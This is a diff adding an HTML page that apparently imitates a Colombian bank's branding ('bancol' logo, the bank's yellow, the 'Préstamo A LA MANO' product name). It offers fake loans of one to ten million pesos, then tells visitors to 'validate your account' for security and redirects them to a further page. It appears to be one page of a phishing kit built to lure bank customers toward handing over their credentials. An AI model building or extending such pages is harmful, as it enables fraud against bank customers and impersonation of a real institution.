@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="es">
+   
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Seleccionar Cantidad</title>
+    <link href="./css/styles.css" rel="stylesheet">
+     
+    <style>
+        body {
+            font-family: "Montserrat", sans-serif;
+            font-weight: 700;
+            font-size: 16px;
+            line-height: 1.5;
+            background-image: url('./css/fondobancol.jpeg');
+            background-size: cover;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .container {
+            background-color: rgba(231, 231, 232, 0.767);
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            max-width: 400px;
+        }
+        h1 {
+            margin-bottom: 20px;
+            font-size: 24px;
+            color: #000;
+        }
+        p {
+            font-size: 18px;
+            margin-bottom: 30px;
+            color: #000
+        }
+        img {
+            width: 100px;
+            height: auto;
+            margin-bottom: 20px;
+            transition: transform 0.3s ease;
+        }
+        img:hover {
+            transform: scale(1.1);
+        }
+        .amount-buttons {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+        button {
+            background-color: #fdda24;
+            color: #0d0c0c;
+            font-family: "Lato", monospace, sans-serif;
+            padding: 10px 9px;
+            border: none;
+            border-radius: 70em;
+            cursor: pointer;
+            font-size: 16px;
+            margin: 0 10px 10px 10px;
+            transition: background-color 0.3s ease;
+            width: 120px; /* Ancho fijo */
+        }
+        button:hover {
+            background-color: #fdda24;
+        }
+        .selected {
+            background-color: #fdda24 !important;
+        }
+        #customAmount {
+            width: calc(100% - 42px);
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px;
+            box-sizing: border-box;
+            margin-bottom: 20px;
+            transition: border-color 0.3s ease;
+        }
+        #customAmount:focus {
+            border-color: #25d366;
+        }
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            overflow: auto;
+            background-color: rgb(255, 255, 255);
+        }
+        .modal-content {
+            background-color: #fff;
+            margin: 15% auto;
+            padding: 20px;
+            border: 1px solid #888;
+            border-radius: 10px;
+            width: 80%;
+            text-align: center;
+        }
+        .modal-content p {
+            margin-bottom: 20px;
+        }
+        .modal-img {
+            width: 150px;
+            height: auto;
+            border-radius: 50%;
+            margin-bottom: 20px;
+        }
+        .modal-btn-container {
+            display: flex;
+            justify-content: space-around;
+        }
+        .modal-btn-container button {
+            background-color: #fdda24;
+            color: #fff;
+            font-family: "Lato", monospace, sans-serif;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background-color 0.3s ease;
+        }
+        .modal-btn-container button:hover {
+            background-color: #a78c09;
+        }
+        .continue-button-container {
+            display: flex;
+            justify-content: center;
+        }
+        #continueButton {
+            display: none;
+            width: 200px;
+            padding: 10px 20px;
+            font-size: 16px;
+            background-color: #fdda24;
+            color: #fff;
+            border: none;
+            border-radius: 70em;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        #continueButton:hover {
+            background-color: #fdda24;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="./css/logobancol.png" alt="Imagen de usuario">
+        <h1>Ya casi obtienes tu Préstamo</h1>
+        <p>A continuación, selecciona la cantidad del Préstamo que deseas solicitar:</p>
+        <div class="amount-buttons">
+            <button onclick="selectAmount(this, 1000000)">COP 1.000.000</button>
+            <button onclick="selectAmount(this, 2000000)">COP 2.000.000</button>
+            <button onclick="selectAmount(this, 5000000)">COP 5.000.000</button>
+            <button onclick="selectAmount(this, 10000000)">COP 10.000.000</button>
+        </div>
+        <div class="continue-button-container">
+            <button id="continueButton" onclick="showConfirmation()">Continuar</button>
+        </div>
+    </div>
+
+    <div id="myModal" class="modal">
+        <div class="modal-content">
+            <img class="modal-img" src="./css/logobancol.png" alt="Alert Icon">
+            <p> ¡Ya casi obtienes tu Prestamo A LA MANO! <br> 
+                Valida tu cuenta como paso final por seguridad y obtén tu prestamo Personal A LA MANO
+            </p>            <div class="modal-btn-container">
+                <button onclick="closeModal()">Cancelar</button>
+                <button onclick="redirectToPage()">Continuar</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        var selectedAmount;
+
+        function selectAmount(button, amount) {
+            var buttons = document.querySelectorAll('.amount-buttons button');
+            buttons.forEach(function(btn) {
+                btn.classList.remove('selected');
+            });
+            button.classList.add('selected');
+            selectedAmount = amount;
+            document.getElementById('continueButton').style.display = 'block';
+        }
+
+        function showConfirmation() {
+            var modal = document.getElementById("myModal");
+            modal.style.display = "block";
+        }
+
+        function closeModal() {
+            var modal = document.getElementById("myModal");
+            modal.style.display = "none";
+        }
+
+        function redirectToPage() {
+            window.location.href = "cargando.html";
+        }
+    </script>
+</body>
+</html>
